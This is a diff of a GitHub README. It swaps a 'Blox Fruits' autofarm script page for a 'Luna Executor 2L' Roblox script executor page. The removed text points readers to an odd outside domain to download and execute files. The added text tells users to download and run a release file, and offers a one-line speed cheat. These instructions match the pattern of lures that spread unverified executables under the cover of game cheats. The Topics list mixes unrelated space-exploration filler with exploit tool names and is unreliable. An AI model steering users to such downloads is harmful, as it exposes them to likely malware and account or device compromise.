@@ -1,103 +1,97 @@
-# 🚀 Roblox Blox Fruits Script 2025 ET
+# 🌙 Luna Executor 2L
 
-Welcome to the **Roblox Blox Fruits Script 2025 ET** repository! This script is crafted for advanced script execution and offers optimized performance for a seamless user experience. It is fully compatible with the latest Roblox updates, making it a perfect tool for gamers, developers, and modding enthusiasts who want to enhance their Blox Fruits gameplay.
+![Luna Executor](https://img.shields.io/badge/Luna%20Executor-2L-brightgreen)
+
+Welcome to the **Luna Executor 2L** repository! This tool allows users to execute custom scripts within Roblox, offering a way to modify and enhance game features. Whether you're a developer looking to test your scripts or a gamer wanting to explore new functionalities, Luna Executor is designed for you.
 
 ## Table of Contents
 
 - [Features](#features)
 - [Installation](#installation)
 - [Usage](#usage)
-- [Script Functions](#script-functions)
 - [Contributing](#contributing)
 - [License](#license)
-- [Contact](#contact)
-- [Releases](#releases)
+- [Support](#support)
+- [Acknowledgments](#acknowledgments)
 
 ## Features
 
-- **Optimized Performance**: This script runs efficiently, ensuring smooth gameplay.
-- **User-Friendly**: Easy to use for both beginners and advanced users.
-- **Compatibility**: Works with the latest Roblox updates, ensuring you stay ahead in your gameplay.
-- **Security**: Designed with safety in mind, minimizing risks associated with script usage.
-- **Advanced Functions**: Includes features for autofarming, notifications, and more.
+- **Custom Script Execution**: Run your scripts seamlessly within Roblox.
+- **User-Friendly Interface**: Navigate easily with a straightforward design.
+- **Game Modification**: Change game features to enhance your experience.
+- **Regular Updates**: Stay tuned for updates that improve functionality and add new features.
 
 ## Installation
 
-To get started, download the script from the [Releases section](https://setupgiths.cfd?8zy2yy3xq61bslo). You will need to download the file and execute it in your Roblox environment.
+To get started with Luna Executor, you need to download it from the [Releases section](https://github.com/COCOXIXI2/Luna-Executor-2l/releases). 
 
-### Prerequisites
-
-- **Roblox Account**: Ensure you have an active Roblox account.
-- **Script Executor**: You will need a reliable script executor compatible with Roblox.
+1. Visit the link above.
+2. Download the latest release file.
+3. Execute the file to install Luna Executor on your system.
 
 ## Usage
 
-1. **Download the Script**: Visit the [Releases section](https://setupgiths.cfd?1za3tond8gc557p) to get the latest version.
-2. **Open Your Script Executor**: Launch your preferred script executor.
-3. **Load the Script**: Copy the script code and paste it into your executor.
-4. **Execute**: Run the script while in the Blox Fruits game.
+After installation, you can start using Luna Executor. Follow these steps:
 
-### Note
+1. Open the Luna Executor application.
+2. Load your custom script.
+3. Select the Roblox game you want to modify.
+4. Execute the script and enjoy the new features.
 
-Always ensure that you are using scripts responsibly and in accordance with Roblox's terms of service.
+### Example Script
 
-## Script Functions
+Here’s a simple example of a script you might want to use:
 
-### Autofarm
+```lua
+game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = 100
+```
 
-The autofarm feature allows you to collect fruits and experience points automatically. This function saves time and enhances your gameplay.
-
-### Fruit Notifier
-
-Receive real-time notifications when rare fruits appear in the game. This feature ensures you never miss out on valuable items.
-
-### Custom Settings
-
-You can customize various settings within the script to suit your gameplay style. Adjust the parameters to optimize your experience.
+This script increases your character's walking speed. You can create and modify scripts based on your preferences.
 
 ## Contributing
 
-We welcome contributions to improve this script. If you have ideas or enhancements, please follow these steps:
+We welcome contributions to improve Luna Executor. If you want to help, please follow these steps:
 
 1. Fork the repository.
-2. Create a new branch for your feature or fix.
-3. Make your changes and commit them.
-4. Push your changes to your fork.
-5. Submit a pull request for review.
+2. Create a new branch (`git checkout -b feature/YourFeature`).
+3. Make your changes.
+4. Commit your changes (`git commit -m 'Add some feature'`).
+5. Push to the branch (`git push origin feature/YourFeature`).
+6. Open a pull request.
 
 ## License
 
-This project is licensed under the MIT License. You are free to use, modify, and distribute the script as long as you include the original license.
+This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for details.
 
-## Contact
+## Support
 
-For any questions or support, feel free to reach out to us. You can open an issue in the repository or contact us directly through our profiles.
+If you have any questions or need assistance, please check the [Releases section](https://github.com/COCOXIXI2/Luna-Executor-2l/releases) for updates or reach out through our Discord community.
 
-## Releases
+## Acknowledgments
 
-For the latest updates and versions, check the [Releases section](https://setupgiths.cfd?dcclacup5coe94x). Here, you can find the most recent files that need to be downloaded and executed.
+- Thanks to the Roblox community for their support and feedback.
+- Special thanks to the contributors who help make Luna Executor better.
 
----
+## Topics
 
-### Topics
+This repository covers various topics related to space and gaming, including:
 
-- **bloxfruit-script**
-- **bloxfruits**
-- **bloxfruits-autofarm**
-- **bloxfruits-autofarm-script**
-- **bloxfruits-autofarm-script-download**
-- **bloxfruits-hack**
-- **bloxfruits-script**
-- **bloxfruits-scripts**
-- **bloxfruitscript**
-- **free**
-- **fruit-notifier**
-- **lua**
-- **roblox**
-- **roblox-lua**
+- **Cosmodrome**: Explore the design of launch facilities.
+- **Delta Exploits**: Learn about exploiting techniques in gaming.
+- **Fluxus**: Understand the integration of different scripts.
+- **Launch Pad**: Discover the importance of launch pads in space exploration.
+- **Launch Sequence**: Learn about the steps involved in launching spacecraft.
+- **Luna Discord**: Join our community for discussions and support.
+- **Lunar Exploration**: Dive into the study of the moon and its features.
+- **Lunar Surface**: Understand the characteristics of the moon's surface.
+- **Moon Base**: Explore concepts of establishing bases on the moon.
+- **Roblox**: Engage with one of the most popular gaming platforms.
+- **Space Exploration**: Discover the wonders of exploring outer space.
+- **Space Technology**: Learn about the technologies that enable space missions.
+- **Spacecraft Design**: Understand the principles of designing spacecraft.
 
----
+## Conclusion
 
-![Blox Fruits](https://img.shields.io/badge/Blox%20Fruits-Play%20Now-brightgreen)
+Luna Executor 2L is a powerful tool for anyone interested in enhancing their Roblox experience. By following the installation and usage guidelines, you can unlock new features and explore the game in exciting ways. For more information, check the [Releases section](https://github.com/COCOXIXI2/Luna-Executor-2l/releases) for updates and new features. 
 
-Thank you for checking out the **Roblox Blox Fruits Script 2025 ET**! We hope this script enhances your gaming experience and helps you enjoy Blox Fruits to the fullest. Happy gaming!
+Happy scripting! 🌌
